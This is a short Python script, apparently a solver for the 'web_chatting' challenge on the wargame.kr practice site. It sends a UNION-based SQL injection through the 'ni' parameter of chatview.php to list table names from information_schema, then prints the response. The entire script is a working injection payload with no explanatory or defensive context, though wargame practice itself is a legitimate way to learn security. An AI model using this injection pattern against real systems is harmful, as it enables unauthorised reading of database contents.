from requests import *
s=session()
url=f'http://wargame.kr:8080/web_chatting/chatview.php?t=1&ni=58880 union select 1,table_name,3,4,5 from information_schema.tables where table_schema=database()--'
print(url)
response=get(url=url)
print(response.text)